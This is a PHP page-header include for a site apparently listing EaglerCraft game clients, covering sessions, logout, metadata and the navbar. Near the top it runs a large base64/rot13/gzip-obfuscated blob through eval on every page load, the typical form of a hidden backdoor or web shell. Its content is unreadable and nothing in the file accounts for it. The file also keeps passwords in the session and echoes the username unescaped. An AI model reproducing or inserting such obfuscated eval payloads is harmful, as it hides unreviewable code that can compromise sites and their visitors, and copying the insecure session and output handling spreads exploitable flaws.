<?php session_start();
require(dirname(__FILE__) . '/logging.php');
$fn = $_SERVER['PHP_SELF'];

if ($fn !== '/index.php') {
if(!isset($_SESSION['notbot'])){
		echo "<script>window.location.replace('/')</script>";
		exit();
	}
}

if(isset($_GET['logout'])){
		eventlogger("<p style='color:red;'>Logout</p>", "User: " . $_SESSION['user'] . " logged out.");
		unset($_SESSION['user']);
		unset($_SESSION['password']);
		unset($_SESSION['mail']);
		setcookie("verified", "true", time() - 99999999);
		echo "<script>window.location.replace('/home.php')</script>"; exit();
	}
$path = $_SERVER['DOCUMENT_ROOT'];
if (isset($_SESSION['user'])){
	setcookie("verified", "true", time() + (86400), "/");
		}
require(dirname(__FILE__) . '/scripts.php');


eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>
<head>
	
<title><?php if (file_exists($path.'/db/site.json')) {
			$name = json_decode(file_get_contents($path.'/db/site.json'));
			echo htmlspecialchars($name->sitetitle);
		} ?></title>
<meta charset="UTF-8">
	<meta name="title" content="<?php if (file_exists($path.'/db/site.json')) {
			$name = json_decode(file_get_contents($path.'/db/site.json'));
			echo htmlspecialchars($name->sitetitle);
		} ?>">
  <meta name="description" content="This site is aimed to be a collection of every client for EaglerCraft.">
  <meta name="keywords" content="Eaglercraft, paragram, eagler, hacks, hax, LAX1DUDE, FuchsiaX, ayuncraft, codercraft, Resent, Precision, minecraft, 1.5.2">
  <meta name="author" content="paragram">
<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="icon" type="image/x-icon" href="<?php if (file_exists($path.'/db/site.json')) {
			$image = json_decode(file_get_contents($path.'/db/site.json'));
			echo htmlspecialchars($image->favicon);
		} ?>">
<link id="theme" rel="stylesheet" type="text/css" href="/assets/style.css" />
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<div class="header">
  <h1><?php if (file_exists($path.'/db/site.json')) {
			$name = json_decode(file_get_contents($path.'/db/site.json'));
			echo htmlspecialchars($name->headtitle);
		} ?></h1>
  <p><?php if (file_exists($path.'/db/site.json')) {
			$name = json_decode(file_get_contents($path.'/db/site.json'));
			echo htmlspecialchars($name->headfooter);
		} ?></p>
</div>
<div class="navbar">
  <a href="/home.php"><i class="fa fa-home" aria-hidden="true"></i> Home</a>
  <a href="/servers.php"><i class="fa fa-server" aria-hidden="true"></i> Servers</a>
  <a href="/relays.php"><i class="fa fa-rss" aria-hidden="true"></i> Relays</a>
	<!--<a href="/test.php">test account</a>
	<button onclick="()">Switch</button>-->

<?php if( isset($_SESSION['user']) && !empty($_SESSION['user']) )
{
?>
			<a href="?logout" class="right"><i class="fa fa-sign-out" aria-hidden="true"></i>
 Logout</a>
			<a href="/account.php" class="right" ><i class="fa fa-user" aria-hidden="true"></i> 
<?php echo $_SESSION["user"] ?></a>
<?php }else{ ?>
     <a href="/login.php" class="right"><i class="fa fa-sign-in" aria-hidden="true"></i> Login</a>
     <a href="/register.php" class="right" ><i class="fa fa-user-plus" aria-hidden="true"></i> 
Register</a>
<?php } ?>
</div>
<!-- Alerts under this line -->

<!-- <div class="alert">
  <span class="closebtn">&times;</span>  
  <strong>Danger!</strong> Indicates a dangerous or potentially negative action.
</div>

<div class="alert success">
  <span class="closebtn">&times;</span>  
  <strong>Success!</strong> Indicates a successful or positive action.
</div> -->
<div class="phonealert">
	<div class="alert warm">
  <span class="closebtn">&times;</span>  
  <strong>WARNING:</strong> This site has minimal phone support and eaglercraft cant be played on phones :/.
</div>
</div>
<!-- <div class="alert warning">
  <span class="closebtn">&times;</span>  
  <strong>Warning!</strong> Indicates a warning that might need attention.
</div>

<!-- Alerts above this line -->
<?php
require(dirname(__FILE__) . '/scripts.php');
?>